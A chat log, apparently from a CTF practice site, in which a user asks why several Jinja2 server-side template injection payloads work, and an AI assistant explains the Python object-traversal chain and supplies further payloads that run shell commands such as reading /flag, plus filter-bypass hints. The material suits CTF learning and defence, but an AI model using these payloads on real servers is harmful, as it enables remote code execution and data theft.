[[ctfshow361ssti初学]]
## 用户

```
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}
......

为什么"",'',[]都行
```

---

## DeepSeek-V3.2

你这个问题问到点子上了——在 Python SSTI 里，`""`、`''`、`[]` 甚至 `{}`、`()` 都能作为**起点**，是因为它们都是 Python **内置对象**，而 SSTI 的本质就是**从任意一个 Python 对象出发，沿着 `__class__` → `__bases__` / `__base__` → `__subclasses__()` 这条链，最终找到危险类（如 `os.system`、`subprocess.Popen`、`file` 等）**。

下面拆解给你看，为什么它们“都行”，以及细微差别。

### 1. 共同目标：找到 `<class 'type'>` 或 `<class 'object'>`
所有 Python 对象的根都是 `object`。  
从任意对象出发：
```
对象 .__class__          → 得到它的类
类 .__bases__[0] / __base__ → 向上到父类，最终到 object
object .__subclasses__() → 拿到当前 Python 环境里所有继承自 object 的类（几百个）
```
一旦有了 `__subclasses__()`，就可以索引到 `os._wrap_close`、`warnings.catch_warnings` 等可以执行命令的类。

### 2. `""` 和 `''`（字符串对象）
```python
"".__class__          → <class 'str'>
"".__class__.__base__ → <class 'object'>
```
字符串是 Python 里最常用、最不容易被过滤的对象之一。

### 3. `[]`（列表对象）
```python
[].__class__          → <class 'list'>
[].__class__.__base__ → <class 'object'>
```
同理。

### 4. 为什么它们都行，但索引 `[40]`、`[257]` 会不同？
因为 **不同 Python 版本 / 不同 web 框架加载的模块不同**，`object.__subclasses__()` 返回的列表顺序和长度会变。  
- 在 Python 3.9 里，`[].__class__.__base__.__subclasses__()[40]` 可能是 `<class 'warnings.catch_warnings'>`，它的 `__init__.__globals__` 里包含 `os`。  
- 在 Python 3.11 里，同一索引可能是其他类，所以需要换索引（如 257、71、75、128 等）。  
你用多种写法（`[]`、`""`、`''`）本质上只是为了**抵达同一个 `object.__subclasses__()`**，所以它们都有效，只是代码写法不一样。

### 5. 为什么有的 payload 用 `__base__`，有的用 `__bases__[0]`？
- `__base__`：直接父类（单继承）
- `__bases__[0]`：父类元组里的第一个（兼容多继承，但大多数情况等同于 `__base__`）  
混用只是为了防止过滤（比如有的 waf 会删 `__base__`，但没删 `__bases__`）。

### 6. 为什么你的几个 payload 里，有的用 `.read()`，有的用 `.popen(...).read()`？
- `[].__class__.__base__.__subclasses__()[40]('flag').read()`  
  这里索引 40 在某个环境里是 `<class '_io.FileIO'>` 或 `<class 'file'>`，直接读文件。  
- 后面带 `os.popen` 的，是因为索引到的类是 `<class 'warnings.catch_warnings'>`，通过它的 `__init__.__globals__['os']` 拿到 os 模块，再执行命令。

### 7. 总结一个通用规律（你可以记下来）
```
任意基础对象 ('' [] {} () ) 
  .__class__         → 获取类
  .__bases__[0]      → 往父类爬（重复几次到 object）
  .__subclasses__()  → 获取所有子类
  [index]            → 找到可用的类（如 subprocess.Popen, os._wrap_close）
  .__init__.__globals__['os'].popen('cmd').read()
```
或者更短（某些环境）：
```
''.__class__.__mro__[2].__subclasses__()[index]...
```

### 针对你的 CTF 题目调试建议
你贴的那些 payload 都像是针对 **Python 3.8~3.10 + Flask/Jinja2** 的常见索引。  
你现在要做的不是死记索引，而是**本地或在线测试当前环境**：

1. **探测可用的索引**  
   先注入：  
   ```
   {{ [].__class__.__base__.__subclasses__() | list }}
   ```
   或
   ```
   {{ "".__class__.__bases__[0].__subclasses__() }}
   ```
   看返回的类列表，手动找 `os._wrap_close`、`subprocess.Popen`、`file` 等。

2. **找 os 模块**  
   常见索引（Python 3.10 左右）：  
   - `[132]` 附近：`os._wrap_close`  
   - `[139]` 附近：`subprocess.Popen`  
   然后：
   ```
   {{ [].__class__.__base__.__subclasses__()[132].__init__.__globals__['os'].popen('cat /flag').read() }}
   ```

3. **如果 `os` 被删了**  
   尝试从 `__builtins__` 找 `eval`、`__import__` 绕。

你当前这个题目如果 `?name={{7*7}}` 返回 `49`，就确认是 Jinja2 SSTI。  
如果返回 `{{7*7}}` 或报错，就不是简单的模板注入，可能被过滤或非 Jinja2。

你可以先试一下 `?name={{[].__class__.__base__.__subclasses__()|length}}`，看看返回的数字（比如 200+），那就是子类总数，然后你再根据这个范围去试索引。